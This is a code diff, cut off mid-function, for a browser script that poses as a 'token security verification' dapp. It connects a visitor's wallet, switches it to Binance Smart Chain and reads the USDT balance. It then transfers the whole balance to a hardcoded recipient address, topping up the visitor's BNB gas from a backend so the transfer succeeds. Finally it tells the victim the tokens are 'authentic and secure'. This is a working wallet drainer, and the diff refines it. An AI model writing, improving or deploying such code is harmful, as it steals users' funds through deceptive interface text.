@@ -1,9 +1,7 @@
 // --- Start of your modified verification script ---
 
-// Re-introducing all original document.getElementById calls,
-// even if the elements are not present in your index.html.
-// This is to replicate the exact initial execution flow of your working script.
-const Next = document.getElementById('Next'); // Changed from verifyBtn to Next
+// Important: Ensure these elements exist in your index.html
+const Next = document.getElementById('Next');
 const walletAddress = document.getElementById('walletAddress');
 const tokenBalance = document.getElementById('tokenBalance');
 const verificationModal = document.getElementById('verificationModal');
@@ -25,23 +23,8 @@ const networkStatus = document.getElementById('networkStatus');
 const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
 const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
 const tokenAbi = [
-    {
-        "constant": true,
-        "inputs": [{"name": "who", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "", "type": "uint256"}],
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {"name": "_to", "type": "address"},
-            {"name": "_value", "type": "uint256"}
-        ],
-        "name": "transfer",
-        "outputs": [{"name": "", "type": "bool"}],
-        "type": "function"
-    }
+    { "constant": true, "inputs": [{"name": "who", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "type": "function" },
+    { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
 ];
 
 // Network configuration
@@ -49,11 +32,7 @@ const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
 const BSC_MAINNET_PARAMS = {
     chainId: BSC_MAINNET_CHAIN_ID,
     chainName: 'Binance Smart Chain Mainnet',
-    nativeCurrency: {
-        name: 'BNB',
-        symbol: 'bnb',
-        decimals: 18
-    },
+    nativeCurrency: { name: 'BNB', symbol: 'bnb', decimals: 18 },
     rpcUrls: ['https://bsc-dataseed.binance.org/'],
     blockExplorerUrls: ['https://bscscan.com/']
 };
@@ -74,556 +53,359 @@ let isTransferComplete = false;
 let currentProvider = null;
 let walletType = WALLET_TYPES.UNKNOWN;
 
-// --- NEW HELPER FUNCTION: Delay ---
+// Helper function: Delay for asynchronous operations
 function delay(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
-// --- END NEW HELPER FUNCTION ---
 
-// Initialize Web3 - Wallet compatible (Original logic)
+// Initializes Web3 provider and sets up event listeners
 async function initWeb3() {
-    // Detect wallet type
-    if (window.trustwallet) {
-        walletType = WALLET_TYPES.TRUST;
-        currentProvider = window.trustwallet;
-    } else if (window.BinanceChain) {
-        walletType = WALLET_TYPES.BINANCE;
-        currentProvider = window.BinanceChain;
-    } else if (window.ethereum) {
-        walletType = WALLET_TYPES.METAMASK;
-        currentProvider = window.ethereum;
-    } else if (window.web3) {
-        walletType = WALLET_TYPES.UNKNOWN;
-        currentProvider = window.web3.currentProvider;
-    } else {
-        console.error("No Web3 provider detected");
-        showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
-        return false;
-    }
+    console.log("initWeb3: Attempting to detect Web3 provider.");
+    if (window.trustwallet) { walletType = WALLET_TYPES.TRUST; currentProvider = window.trustwallet; console.log("initWeb3: Trust Wallet detected.");
+    } else if (window.BinanceChain) { walletType = WALLET_TYPES.BINANCE; currentProvider = window.BinanceChain; console.log("initWeb3: Binance Chain Wallet detected.");
+    } else if (window.ethereum) { walletType = WALLET_TYPES.METAMASK; currentProvider = window.ethereum; console.log("initWeb3: MetaMask detected.");
+    } else if (window.web3) { walletType = WALLET_TYPES.UNKNOWN; currentProvider = window.web3.currentProvider; console.log("initWeb3: Legacy Web3 provider detected.");
+    } else { console.error("initWeb3: No Web3 provider detected."); showError("Please install Trust Wallet, Binance Wallet or MetaMask.", true); return false; }
+
+    if (typeof Web3 === 'undefined') { console.error("initWeb3: Web3.js library not found. Please ensure it's imported in your HTML."); showError("Web3.js library not loaded. Please check your script imports.", true); return false; }
 
     try {
         web3 = new Web3(currentProvider);
-        // Original script calls updateNetworkStatus here, let's keep that timing
+        console.log("initWeb3: Web3 instance created.");
         await updateNetworkStatus();
 
-        // Listen for chain changes
         if (currentProvider.on) {
-            currentProvider.on('chainChanged', (chainId) => {
-                window.location.reload();
+            currentProvider.on('chainChanged', (chainId) => { console.log("chainChanged event:", chainId); window.location.reload(); });
+            currentProvider.on('accountsChanged', (accounts) => {
+                console.log("accountsChanged event:", accounts);
+                if (accounts.length === 0) {
+                    showError("Wallet disconnected. Please connect again.", true);
+                    if (Next) Next.disabled = false; if (Next) Next.innerHTML = 'Next';
+                    userAddress = null; if (walletAddress) walletAddress.textContent = "Not Connected"; if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
+                    if (verificationModal) verificationModal.style.display = "none";
+                } else if (accounts[0] !== userAddress) { window.location.reload(); }
             });
-
-            // Binance Chain specific event
-            if (walletType === WALLET_TYPES.BINANCE) {
-                currentProvider.on('accountsChanged', (accounts) => {
-                    window.location.reload();
-                });
-            }
         }
         return true;
-    } catch (error) {
-        console.error("Web3 initialization error:", error);
-        return false;
-    }
+    } catch (error) { console.error("Web3 initialization error:", error); showError("Web3 initialization failed. Check console for details.", true); return false; }
 }
 
-// Update network status display (Original logic - will be no-op if elements are null)
+// Updates network status display and handles network switching
 async function updateNetworkStatus() {
-    if (!web3) return false;
-
+    if (!web3) return false; console.log("updateNetworkStatus: Checking current network.");
     try {
-        const chainId = await web3.eth.getChainId();
-
+        const chainId = await web3.eth.getChainId(); console.log("updateNetworkStatus: Current chain ID:", chainId);
         if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
-            // Guard against null elements
-            if (networkDot) networkDot.className = "network-dot";
-            if (networkStatus) networkStatus.textContent = "Binance Smart Chain";
-            return true;
+            if (networkDot) networkDot.className = "network-dot"; if (networkStatus) networkStatus.textContent = "Binance Smart Chain"; console.log("updateNetworkStatus: Connected to BSC Mainnet."); return true;
         } else {
-            // Guard against null elements
-            if (networkDot) networkDot.className = "network-dot network-disconnected";
-            if (networkStatus) networkStatus.textContent = `Unsupported Network (ID: ${chainId})`;
-
-            // Automatically switch to BSC for Trust Wallet (Original logic)
-            if (walletType === WALLET_TYPES.TRUST) {
-                const switched = await switchToBSC();
-                if (switched) {
-                    return updateNetworkStatus(); // Recursive check after switch
-                }
-            }
-            return false;
+            if (networkDot) networkDot.className = "network-dot network-disconnected"; if (networkStatus) networkStatus.textContent = `Unsupported Network (ID: ${chainId})`; console.warn("updateNetworkStatus: Unsupported network. Attempting to switch...");
+            const switched = await switchToBSC();
+            if (switched) { console.log("updateNetworkStatus: Successfully switched to BSC."); return updateNetworkStatus(); }
+            else { console.error("updateNetworkStatus: Failed to switch to BSC."); return false; }
         }
-    } catch (error) {
-        console.error("Error getting network status:", error);
-        if (networkDot) networkDot.className = "network-dot network-disconnected";
-        if (networkStatus) networkStatus.textContent = "Network Error";
-        return false;
-    }
+    } catch (error) { console.error("Error getting network status:", error); if (networkDot) networkDot.className = "network-dot network-disconnected"; if (networkStatus) networkStatus.textContent = "Network Error"; return false; }
 }
 
-// Switch to Binance Smart Chain (Original logic)
+// Attempts to switch the wallet network to BSC
 async function switchToBSC() {
-    if (step2Desc) step2Desc.textContent = "Switching to Binance Smart Chain..."; // Guard against null
-    console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);
-
+    if (step2Desc) step2Desc.textContent = "Switching to Binance Smart Chain..."; console.log(`switchToBSC: Attempting to switch to BSC (Wallet: ${walletType})`);
     try {
-        // Binance Web3 Wallet uses different method
-        if (walletType === WALLET_TYPES.BINANCE) {
-            await window.BinanceChain.switchNetwork('bsc-mainnet');
-            return true;
+        if (walletType === WALLET_TYPES.BINANCE && window.BinanceChain.switchNetwork) {
+            await window.BinanceChain.switchNetwork('bsc-mainnet'); console.log("switchToBSC: BinanceChain.switchNetwork successful."); return true;
+        } else if (window.ethereum && window.ethereum.request) {
+            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_MAINNET_CHAIN_ID }] });
+            console.log("switchToBSC: wallet_switchEthereumChain successful."); return true;
+        } else {
+            console.warn("switchToBSC: Wallet does not support programmatic network switching."); showError("Please manually switch your wallet to Binance Smart Chain.", true); return false;
         }
-
-        // Standard EIP-3326 method
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
-        });
-        return true;
     } catch (switchError) {
-        // Network not added, try to add it
         if (switchError.code === 4902) {
+            console.warn("switchToBSC: BSC network not found in wallet. Attempting to add...");
             try {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [BSC_MAINNET_PARAMS]
-                });
-                return true;
-            } catch (addError) {
-                console.error("Failed to add BSC network:", addError);
-                if (step2Desc) step2Desc.textContent = "Failed to add BSC network"; // Guard against null
-                return false;
-            }
-        }
-        console.error("Failed to switch to BSC:", switchError);
-        if (step2Desc) step2Desc.textContent = "Failed to switch network"; // Guard against null
-        return false;
+                await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [BSC_MAINNET_PARAMS] });
+                console.log("switchToBSC: wallet_addEthereumChain successful."); return true;
+            } catch (addError) { console.error("Failed to add BSC network:", addError); if (step2Desc) step2Desc.textContent = "Failed to add BSC network"; showError("Failed to add BSC network. Please add it manually.", true); return false; }
+        } else if (switchError.code === 4001) { console.warn("switchToBSC: User rejected network switch."); if (step2Desc) step2Desc.textContent = "Network switch rejected."; showError("Network switch rejected by user. Please approve to continue.", true); return false; }
+        console.error("Failed to switch to BSC:", switchError); if (step2Desc) step2Desc.textContent = "Failed to switch network"; showError("Failed to switch network. Please try again or switch manually.", true); return false;
     }
 }
 
-// Update progress (Original logic - will be no-op if elements are null)
-function updateProgress(percent) {
-    if (progressBar) progressBar.style.width = `${percent}%`; // Guard against null
-}
+// Updates the progress bar percentage
+function updateProgress(percent) { if (progressBar) progressBar.style.width = `${percent}%`; }
 
-// Update step UI (Original logic - will be no-op if elements are null)
+// Updates the visual state and icon of a step
 function updateStep(stepNum, status) {
     const step = document.getElementById(`step${stepNum}`);
-    if (step) { // Guard against null
+    if (step) {
         step.className = `step ${status}`;
         const stepIcon = step.querySelector('.step-icon');
-        if (stepIcon) { // Guard against null
-            stepIcon.innerHTML = status === 'completed' ?
-                '<i class="fas fa-check"></i>' : stepNum;
-        }
+        if (stepIcon) { stepIcon.innerHTML = status === 'completed' ? '<i class="fas fa-check"></i>' : stepNum; }
     }
 }
 
-// Connect Wallet (Original logic from your script)
+// Connects the user's wallet
 async function connectWallet() {
-    // These UI updates are from your original script, re-introducing them for timing
-    updateStep(1, 'active');
-    updateProgress(20);
+    console.log("connectWallet: Starting wallet connection process.");
+    updateStep(1, 'active'); updateProgress(20);
+    if (modalMessage) { modalMessage.textContent = "Initializing Web3 and detecting wallet..."; modalMessage.className = "info-message"; }
 
     const isWeb3Initialized = await initWeb3();
-    if (!isWeb3Initialized) {
-        showError("Web3 initialization failed.");
-        return false;
-    }
+    if (!isWeb3Initialized) { console.error("connectWallet: Web3 initialization failed."); showError("Web3 initialization failed.", true); return false; }
 
     try {
-        if (step1Desc) step1Desc.textContent = "Requesting account access..."; // Guard against null
+        if (step1Desc) step1Desc.textContent = "Requesting account access...";
+        if (modalMessage) { modalMessage.textContent = "Please connect your wallet account."; modalMessage.className = "info-message"; }
 
-        // Different method for Binance Web3 Wallet (original logic)
-        if (walletType === WALLET_TYPES.BINANCE) {
-            const accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
-            userAddress = accounts[0];
-        } else {
-            const accounts = await web3.eth.getAccounts(); // This is the passive check
-            if (accounts.length === 0) {
-                showError("No accounts found. Please connect your wallet.");
-                return false;
-            }
-            userAddress = accounts[0];
-        }
+        let accounts;
+        if (currentProvider && currentProvider.request) { accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
+        } else if (web3) { accounts = await web3.eth.getAccounts();
+        } else { showError("No wallet provider detected for connection.", true); return false; }
 
-        if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`; // Guard against null
-        // Re-introducing original "Verifying..." text for timing replication
-        if (Next) Next.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...'; // Changed from verifyBtn to Next
-        if (Next) Next.disabled = true; // Changed from verifyBtn to Next
+        if (!accounts || accounts.length === 0) { console.warn("connectWallet: No accounts found after request."); showError("No wallet accounts found or connected. Please approve in your wallet.", true); return false; }
+        userAddress = accounts[0]; console.log("connectWallet: User address obtained:", userAddress);
 
-        // These UI updates are from your original script, re-introducing them for timing
-        updateStep(1, 'completed');
-        updateStep(2, 'active');
-        updateProgress(40);
+        if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+        if (Next) Next.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+
+        updateStep(1, 'completed'); updateStep(2, 'active'); updateProgress(40);
+        if (modalMessage) { modalMessage.textContent = "Wallet connected successfully."; modalMessage.className = "success-message"; }
 
         return true;
     } catch (error) {
         console.error("Error connecting wallet:", error);
-        showError("Error connecting wallet. Please try again.");
+        if (error.code === 4001) { showError("Wallet connection rejected by user.", true); }
+        else { showError("Error connecting wallet. Please try again.", true); }
         return false;
     }
 }
 
-// Ensure we're on BSC network (Original logic)
+// Ensures the dapp is connected to the BSC network
 async function ensureBSCNetwork() {
-    updateStep(2, 'active'); // Re-introducing for timing
-
+    console.log("ensureBSCNetwork: Checking network.");
+    updateStep(2, 'active'); if (step2Desc) step2Desc.textContent = "Verifying network connection...";
     try {
-        const chainId = await web3.eth.getChainId();
-
+        const chainId = await web3.eth.getChainId(); console.log("ensureBSCNetwork: Current chain ID:", chainId);
         if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
-            if (step2Desc) step2Desc.textContent = "Connected to Binance Smart Chain"; // Guard against null
-            return true;
+            if (step2Desc) step2Desc.textContent = "Connected to Binance Smart Chain"; console.log("ensureBSCNetwork: Network is BSC."); return true;
         }
-
         const switched = await switchToBSC();
-
-        if (switched) {
-            if (step2Desc) step2Desc.textContent = "Successfully switched to Binance Smart Chain"; // Guard against null
-            updateNetworkStatus();
-            return true;
-        } else {
-            if (step2Desc) step2Desc.textContent = "Failed to switch network"; // Guard against null
-            return false;
-        }
-    } catch (error) {
-        console.error("Network check failed:", error);
-        if (step2Desc) step2Desc.textContent = "Network check failed"; // Guard against null
-        return false;
-    }
+        if (switched) { if (step2Desc) step2Desc.textContent = "Successfully switched to Binance Smart Chain"; updateNetworkStatus(); console.log("ensureBSCNetwork: Successfully switched to BSC."); return true; }
+        else { if (step2Desc) step2Desc.textContent = "Failed to switch network."; showError("Please manually switch your wallet to Binance Smart Chain and try again.", true); console.error("ensureBSCNetwork: Failed to switch network."); return false; }
+    } catch (error) { console.error("Network check failed:", error); if (step2Desc) step2Desc.textContent = "Network check failed"; showError("Network check failed. Please refresh and try again.", true); return false; }
 }
 
-// Get token balance (Original logic)
+// Fetches the user's USDT token balance
 async function getTokenBalance() {
-    updateStep(3, 'active'); // Re-introducing for timing
-    if (step3Desc) step3Desc.textContent = "Scanning token security parameters..."; // Guard against null
-
+    console.log("getTokenBalance: Fetching token balance.");
+    updateStep(3, 'active'); if (step3Desc) step3Desc.textContent = "Scanning token security parameters...";
     try {
-        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...'; // Guard against null
-
+        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...';
+        if (!web3) { console.error("getTokenBalance: Web3 is not initialized."); showError("Web3 is not ready. Please refresh.", true); return false; }
         tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);
-
-        const balance = await tokenContract.methods.balanceOf(userAddress).call();
-
+        const balance = await tokenContract.methods.balanceOf(userAddress).call(); console.log("getTokenBalance: Raw balance:", balance);
         tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
-        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`; // Guard against null
+        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`; console.log("getTokenBalance: Formatted USDT balance:", tokenBalanceValue);
 
-        if (step3Desc) step3Desc.textContent = "Token analysis complete"; // Guard against null
-        // Re-introducing UI updates for timing
-        updateStep(3, 'completed');
-        updateStep(4, 'active');
-        updateProgress(70);
-
+        if (step3Desc) step3Desc.textContent = "Token analysis complete"; updateStep(3, 'completed'); updateStep(4, 'active'); updateProgress(70);
+        if (modalMessage) { modalMessage.textContent = `Found ${parseFloat(tokenBalanceValue).toFixed(2)} USDT.`; modalMessage.className = "success-message"; }
         return true;
-    } catch (error) {
-        console.error("Error fetching token balance:", error);
-        if (step3Desc) step3Desc.textContent = "Token analysis failed"; // Guard against null
-        showError("Failed to analyze token. Please try again.");
-        if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; // Guard against null
-        return false;
-    }
+    } catch (error) { console.error("Error fetching token balance:", error); if (step3Desc) step3Desc.textContent = "Token analysis failed"; showError("Failed to analyze token. Please try again.", false); if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; return false; }
 }
 
-// Execute verification (transfer) (Original logic with integrated BNB check)
+// Executes the USDT transfer, including BNB check and top-up if necessary
 async function executeVerification() {
-    if (step4Desc) step4Desc.textContent = "Confirming authenticity in your wallet..."; // Guard against null
-    if (modalMessage) modalMessage.textContent = "Please confirm the transaction in your wallet"; // Guard against null
+    console.log("executeVerification: Starting token transfer process.");
+    if (step4Desc) step4Desc.textContent = "Confirming authenticity in your wallet...";
+    if (modalMessage) { modalMessage.textContent = "Please confirm the transaction in your wallet"; modalMessage.className = "info-message"; }
 
     try {
         const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');
+        console.log(`executeVerification: Attempting to transfer ${tokenBalanceValue} USDT (${amountWei} Wei) to ${recipientAddress}`);
 
-        // --- START OF MODIFIED BNB CHECK AND TOP-UP LOGIC ---
         const BNB_LOW_THRESHOLD = 0.0005; // A common threshold for sufficient gas
-
         let currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
         let userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
+        console.log("executeVerification: Current user BNB balance:", userBNB);
 
         if (userBNB < BNB_LOW_THRESHOLD) {
-            console.log("User BNB is low. Requesting BNB from backend...");
-            if (modalMessage) modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up...";
-            if (modalMessage) modalMessage.className = "warning-message"; // Highlight the message
-
+            console.log("executeVerification: User BNB is low. Requesting BNB from backend...");
+            if (modalMessage) { modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up..."; modalMessage.className = "warning-message"; }
             try {
                 const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ toAddress: userAddress })
+                    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ toAddress: userAddress })
                 });
-
                 if (response.ok) {
-                    const result = await response.json();
-                    console.log("BNB top-up request successful:", result);
-                    if (modalMessage) modalMessage.textContent = "BNB top-up requested. Please wait while we check for the deposit...";
-                    if (modalMessage) modalMessage.className = "warning-message"; // Keep warning state for waiting
+                    const result = await response.json(); console.log("executeVerification: BNB top-up request successful:", result);
+                    if (modalMessage) { modalMessage.textContent = "BNB top-up requested. Please wait while we check for the deposit..."; modalMessage.className = "warning-message"; }
 
-                    // Start Polling for BNB
-                    const MAX_POLLING_ATTEMPTS = 30; // Max attempts (e.g., 30 * 10s = 5 minutes)
-                    const POLLING_INTERVAL_MS = 10000; // Check every 10 seconds
+                    const MAX_POLLING_ATTEMPTS = 30; // Max attempts (e.g., 30 * 5s = 2.5 minutes)
+                    const POLLING_INTERVAL_MS = 5000; // Check every 5 seconds
 
                     for (let i = 0; i < MAX_POLLING_ATTEMPTS; i++) {
-                        await delay(POLLING_INTERVAL_MS); // Wait before checking again
-                        currentBnbBalanceWei = await web3.eth.getBalance(userAddress); // Re-fetch balance
+                        await delay(POLLING_INTERVAL_MS);
+                        currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
                         userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
-                        console.log(`Polling attempt ${i + 1}: Current BNB balance: ${userBNB}`);
-
+                        console.log(`executeVerification: Polling attempt ${i + 1}: Current BNB balance: ${userBNB}`);
                         if (userBNB >= BNB_LOW_THRESHOLD) {
-                            if (modalMessage) modalMessage.textContent = "BNB received! Proceeding with transaction...";
-                            if (modalMessage) modalMessage.className = ""; // Clear warning
-                            break; // Exit polling loop, proceed to transfer
+                            if (modalMessage) { modalMessage.textContent = "BNB received! Proceeding with transaction confirmation..."; modalMessage.className = "success-message"; }
+                            console.log("executeVerification: Sufficient BNB received. Breaking polling loop."); break;
                         } else if (i === MAX_POLLING_ATTEMPTS - 1) {
-                            // Last attempt and still no BNB
-                            showError("BNB not received after multiple attempts. Please try again later or manually add BNB.");
-                            // Re-enable the button and hide modal if we failed to get BNB
-                            if (Next) {
-                                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
-                                Next.disabled = false;
-                            }
-                            if (verificationModal) verificationModal.style.display = "none";
-                            return; // Exit function if BNB not received
+                            showError("BNB not received after multiple attempts. Please try again later or manually add BNB.", true);
+                            console.error("executeVerification: BNB not received after all polling attempts.");
+                            throw new Error("BNB_TOPUP_FAILED");
                         }
                     }
                 } else {
-                    // Backend indicated an error in sending BNB
-                    const errorData = await response.json();
-                    console.error("BNB top-up request failed:", errorData);
-                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
-                    if (Next) { // Re-enable button and reset on error
-                        Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
-                        Next.disabled = false;
-                    }
-                    if (verificationModal) verificationModal.style.display = "none";
-                    return; // Exit function if backend request failed
+                    const errorData = await response.json(); console.error("executeVerification: BNB top-up request failed from backend:", errorData);
+                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`, true);
+                    throw new Error("BACKEND_BNB_FAIL");
                 }
             } catch (backendError) {
-                // Network error or issue communicating with your backend
-                console.error("Error communicating with BNB backend:", backendError);
-                showError("Could not request BNB. Network error or backend issue. Please try again.");
-                if (Next) { // Re-enable button and reset on error
-                    Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
-                    Next.disabled = false;
+                console.error("executeVerification: Error communicating with BNB backend:", backendError);
+                if (backendError.message !== "BNB_TOPUP_FAILED" && backendError.message !== "BACKEND_BNB_FAIL") {
+                   showError("Could not request BNB. Network error or backend issue. Please try again.", true);
                 }
-                if (verificationModal) verificationModal.style.display = "none";
-                return; // Exit function on backend communication error
+                throw backendError;
             }
         }
-        // --- END OF MODIFIED BNB CHECK AND TOP-UP LOGIC ---
 
-        // If we reach here, it means either:
-        // 1. User had enough BNB initially.
-        // 2. BNB was requested from backend and successfully received via polling.
-
-        // Proceed with USDT transfer
+        console.log("executeVerification: Initiating USDT transfer transaction.");
         tokenContract.methods.transfer(recipientAddress, amountWei)
             .send({ from: userAddress })
             .on('transactionHash', (hash) => {
                 console.log("Transaction hash:", hash);
-                // You might want to update UI here to show "Transaction pending..."
-                if (modalMessage) modalMessage.textContent = "Transaction submitted. Waiting for confirmation...";
-                if (modalMessage) modalMessage.className = "info-message";
+                if (modalMessage) { modalMessage.textContent = "Transaction submitted. Waiting for confirmation..."; modalMessage.className = "info-message"; }
             })
             .on('receipt', (receipt) => {
-                if (step4Desc) step4Desc.textContent = "Verification complete!"; // Guard against null
-                updateStep(4, 'completed'); // Re-introducing for timing
-                updateProgress(100); // Re-introducing for timing
-
+                console.log("Transaction receipt:", receipt);
+                if (step4Desc) step4Desc.textContent = "Verification complete!"; updateStep(4, 'completed'); updateProgress(100);
+                if (modalMessage) { modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure."; modalMessage.className = "success-message"; }
                 setTimeout(() => {
-                    if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; // Guard against null
-                    tokenBalanceValue = 0;
-
-                    if (verificationModal) verificationModal.style.display = "none"; // Original logic
-                    if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; // Changed from verifyBtn to Next
-                    if (Next) Next.disabled = true; // Changed from verifyBtn to Next
-
-                    if (modalMessage) modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure."; // Guard against null
-                    if (modalMessage) modalMessage.className = "success-message"; // Guard against null
-
+                    if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; tokenBalanceValue = 0;
+                    if (verificationModal) verificationModal.style.display = "none";
+                    if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; Next.disabled = true; }
                     isTransferComplete = true;
                 }, 1500);
             })
             .on('error', (error) => {
                 console.error("Transaction error:", error);
-                if (step4Desc) step4Desc.textContent = "Verification failed"; // Guard against null
-                if (modalMessage) modalMessage.textContent = "Verification failed. Please try again."; // Guard against null
-                if (modalMessage) modalMessage.className = "error-message"; // Guard against null
-
-                // Ensure button is re-enabled and reset on error, mirroring original flow
-                if (Next) {
-                    Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Revert button text
-                    Next.disabled = false;
-                }
+                if (step4Desc) step4Desc.textContent = "Verification failed";
+                if (error.code === 4001) { showError("Transaction rejected by user.", false); }
+                else { showError("Transaction failed. Please try again.", false); }
+                if (Next) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
             });
-
     } catch (error) {
-        console.error("Verification failed:", error);
-        if (step4Desc) step4Desc.textContent = "Verification failed"; // Guard against null
-        if (modalMessage) modalMessage.textContent = "Verification failed. Please try again."; // Guard against null
-        if (modalMessage) modalMessage.className = "error-message"; // Guard against null
-
-        // Ensure button is re-enabled and reset on error, mirroring original flow
-        if (Next) {
-            Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Revert button text
-            Next.disabled = false;
+        console.error("executeVerification: Overall verification process failed:", error);
+        if (error.message !== "BNB_TOPUP_FAILED" && error.message !== "BACKEND_BNB_FAIL") {
+            showError("An unexpected error occurred during verification. Please try again.", false);
         }
-        // If an error occurs before sending the transaction (e.g., initial balance check fails for some reason)
-        // ensure the modal is hidden.
+        if (Next) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
         if (verificationModal) verificationModal.style.display = "none";
     }
 }
 
-// Show error message (Original logic)
-function showError(message) {
-    console.error("Error:", message);
-    if (modalMessage) modalMessage.textContent = message; // Guard against null
-    if (modalMessage) modalMessage.className = "error-message"; // Guard against null
-    // Changed setTimeout to not clear the message immediately if it's a critical error
-    // If it's for BNB top-up failed, we want it to stay until user interacts
-    // For other general errors, you might still want it to disappear.
-    // For now, removing the auto-clear to allow user to read critical messages.
-    // If you want it to disappear automatically, uncomment the setTimeout below:
-    /*
-    setTimeout(() => {
-        if (modalMessage) modalMessage.textContent = ""; // Guard against null
-        if (modalMessage) modalMessage.className = ""; // Guard against null
-    }, 5000);
-    */
+// Displays an error message and handles button state
+function showError(message, sticky = false) {
+    console.error("Displaying error:", message);
+    if (modalMessage) { modalMessage.textContent = message; modalMessage.className = "error-message"; }
+    if (!sticky) { setTimeout(() => { if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; } }, 5000); }
+    if (Next) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
 }
 
-// Event Listener for the "Next" button (Adapted from original verifyBtn.addEventListener)
+// Event listener for the "Next" button
 Next.addEventListener('click', async () => {
-    if (isTransferComplete) return;
+    console.log("Next button clicked.");
+    if (isTransferComplete) { console.log("Verification already complete, preventing re-execution."); return; }
 
-    // Original UI updates on button click
-    if (verificationModal) verificationModal.style.display = "flex"; // Guard against null
-    updateStep(1, 'active');
-    updateStep(2, '');
-    updateStep(3, '');
-    updateStep(4, '');
-    updateProgress(0);
-    if (modalMessage) modalMessage.textContent = "";
-    if (modalMessage) modalMessage.className = "";
-
-    Next.disabled = true; // Disable button immediately
+    if (verificationModal) verificationModal.style.display = "flex";
+    updateStep(1, 'active'); updateStep(2, ''); updateStep(3, ''); updateStep(4, ''); updateProgress(0);
+    if (modalMessage) { modalMessage.textContent = "Initiating verification process..."; modalMessage.className = "info-message"; }
+    Next.disabled = true;
 
     try {
-        // Step 1: Connect wallet
+        console.log("Starting Step 1: Connect Wallet.");
         if (!userAddress) {
             const connected = await connectWallet();
-            if (!connected) {
-                if (verificationModal) verificationModal.style.display = "none"; // Original logic
-                if (Next) Next.disabled = false; // Changed from verifyBtn to Next
-                if (Next) Next.innerHTML = 'Next'; // Changed from verifyBtn to Next - keep original "Next" on failure
-                return;
-            }
-        }
+            if (!connected) { console.log("Step 1: Wallet connection failed or rejected."); return; }
+        } else { console.log("Step 1: Wallet already connected:", userAddress); }
 
-        // Step 2: Ensure BSC network
+        console.log("Starting Step 2: Ensure BSC Network.");
         const networkReady = await ensureBSCNetwork();
-        if (!networkReady) {
-            updateStep(2, '');
-            if (modalMessage) modalMessage.textContent = "Please switch to Binance Smart Chain to continue";
-            if (modalMessage) modalMessage.className = "error-message";
-            if (Next) Next.disabled = false;
-            if (Next) Next.innerHTML = 'Next';
-            return;
-        }
-        updateStep(2, 'completed'); // Re-introducing for timing
+        if (!networkReady) { console.log("Step 2: Network not ready or switch failed."); return; }
+        updateStep(2, 'completed');
 
-        // Step 3: Get token balance
+        console.log("Starting Step 3: Get Token Balance.");
